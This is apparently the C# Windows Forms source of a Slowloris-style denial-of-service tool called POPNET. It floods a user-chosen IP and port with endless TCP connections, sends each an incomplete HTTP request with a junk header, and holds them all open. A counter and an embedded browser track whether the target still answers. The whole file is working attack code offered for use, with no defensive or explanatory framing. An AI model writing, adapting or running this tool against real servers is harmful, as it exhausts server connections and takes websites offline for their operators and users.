using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Threading;
using System.Net.Sockets;

namespace POPNET
{
    public partial class Form1 : Form
    {

        List<Socket> sockets = new List<Socket>();

        Socket setupSocket(string ip, int port)
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);


            try
            {
                sock.Connect(ip, port);
            }

            catch
            {
                Console.WriteLine("Connect ERROR");
            }




            sock.Send(Encoding.Default.GetBytes("GET / HTTP/1.1\r\n"));


            sock.Send(Encoding.Default.GetBytes("POPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOPPOP\r\n"));



            return sock;

        }



        int count = 0;

        public void main(string ip, string arg_port)
        {
            int port = Int32.Parse(arg_port);



            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            sock.SendTimeout = 100;
            


            while (true)
            {


                try
                {

                    sock = setupSocket(ip, port);


                    count++;
                    label1.Text = count.ToString();
                    


                }

                catch
                {
                    Console.WriteLine("Socket ERROR");


                    label1.Text = count.ToString();



                }


                sockets.Add(sock);

            }


        }













        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
  


        }

        bool toggle = false;


        private Thread rTh;



        private void button1_Click(object sender, EventArgs e)
        {
            label2.Text = textBox1.Text;


            // Start
            if (toggle == false)
            {
                count = 0;

                rTh = new Thread(() => main(textBox1.Text, textBox2.Text));

                textBox1.Enabled = false;
                textBox2.Enabled = false;


                button1.Text = "Stop";

                if (radioButton1.Checked)
                {
                    webBrowser1.Navigate("http://" + textBox1.Text + ":" + textBox2.Text);
                }
                else if (radioButton2.Checked)
                {
                    webBrowser1.Navigate("https://" + textBox1.Text + ":" + textBox2.Text);
                }
;


          
                rTh.Start();
                

                
                toggle = true;

             
            }
            
            // Stop
            else if(toggle == true)
            {
                textBox1.Enabled = true;
                textBox2.Enabled = true;


                button1.Text = "Start";

                if (radioButton1.Checked)
                {
                    webBrowser1.Navigate("http://" + textBox1.Text + ":" + textBox2.Text);
                }
                else if (radioButton2.Checked)
                {
                    webBrowser1.Navigate("https://" + textBox1.Text + ":" + textBox2.Text);
                }



                rTh.Interrupt(); 

                rTh.Abort();


                rTh = null;

                toggle = false;

            }
            



        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(radioButton1.Checked)
            { 
                webBrowser1.Navigate("http://"+textBox1.Text+":"+textBox2.Text);
            }
            else if(radioButton2.Checked)
            {
                webBrowser1.Navigate("https://" + textBox1.Text + ":" + textBox2.Text);
            }

        }

 
    }
}
